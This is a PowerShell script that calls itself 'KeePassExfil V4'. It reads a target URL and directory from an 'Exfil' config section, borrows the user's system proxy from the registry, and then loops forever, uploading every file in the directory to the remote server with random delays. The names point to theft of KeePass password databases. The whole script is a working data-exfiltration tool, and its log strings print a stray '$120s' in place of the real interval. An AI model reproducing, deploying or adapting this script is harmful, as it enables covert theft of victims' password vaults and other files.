param([string]$ConfigPath)

$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $ConfigPath) { $ConfigPath = Join-Path $ScriptDir "config.ini" }
$LogPath = Join-Path $ScriptDir "keepexfil.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try { "$timestamp $Message" | Out-File -FilePath $LogPath -Append -Encoding UTF8 } catch {}
}

function Get-IniValue($path, $section, $key) {
    $sectionHeader = "[$section]"
    $inSection = $false
    Get-Content $path | ForEach-Object {
        $line = $_.Trim()
        if ($line -eq $sectionHeader) { $inSection = $true; return }
        if ($line.StartsWith("[")) { $inSection = $false; return }
        if ($inSection -and $line -like "$key=*") {
            return $line.Substring($line.IndexOf("=") + 1)
        }
    }
}

$url = Get-IniValue $ConfigPath "Exfil" "Url"
$dir = Get-IniValue $ConfigPath "Exfil" "Dir"
$interval = [int](Get-IniValue $ConfigPath "Exfil" "Interval")
if ($interval -lt 10) { $interval = 30 }
$dir = [Environment]::ExpandEnvironmentVariables($dir)
if ($url -eq "" -or $dir -eq "") { Write-Log "Config error: Url or Dir empty"; exit 1 }

Write-Log "=== KeePassExfil V4 Started ==="
Write-Log "Url=$url  Dir=$dir  Interval=$120s"

# Proxy detection
$proxyAddr = $null
try {
    $reg = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -ErrorAction Stop
    if ($reg.ProxyEnable -eq 1 -and $reg.ProxyServer) {
        Write-Log "Proxy raw: $($reg.ProxyServer)"
        $p = $reg.ProxyServer
        if ($p -match "=") { $p = ($p -split ";") | Where-Object { $_ -match "^http=" } | Select-Object -First 1 | ForEach-Object { $_ -replace "^http=", "" } }
        if ($p -match "^(.+):(\d+)$") {
            Write-Log "Proxy detected: $($matches[1]):$($matches[2])"
            $proxyAddr = $p
        } else { Write-Log "No proxy detected" }
    } else { Write-Log "No proxy detected" }
} catch { Write-Log "Proxy detection error: $_" }

Write-Log "Initialization complete"

while ($true) {
    if (-not (Test-Path $dir)) {
        Write-Log "Dir not found: $dir - sleep 60s"
        Start-Sleep -Seconds 60
        continue
    }
    try {
        foreach ($file in (Get-ChildItem $dir -File -ErrorAction Stop)) {
            $uploadUrl = "$url/$($file.Name)"
            Write-Log "Sending: $($file.Name) ($($file.Length)B) -> $uploadUrl"
            try {
                $wc = New-Object System.Net.WebClient
                if ($proxyAddr) { $wc.Proxy = New-Object System.Net.WebProxy($proxyAddr) }
                $wc.UploadFile($uploadUrl, $file.FullName)
                Write-Log "  -> OK"
            } catch { Write-Log "  -> ERROR: $($_.Exception.Message)" }
            Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 500)
        }
    } catch { Write-Log "Enum error: $_" }
    Write-Log "Sleep $120s"
    Start-Sleep -Seconds $interval
}
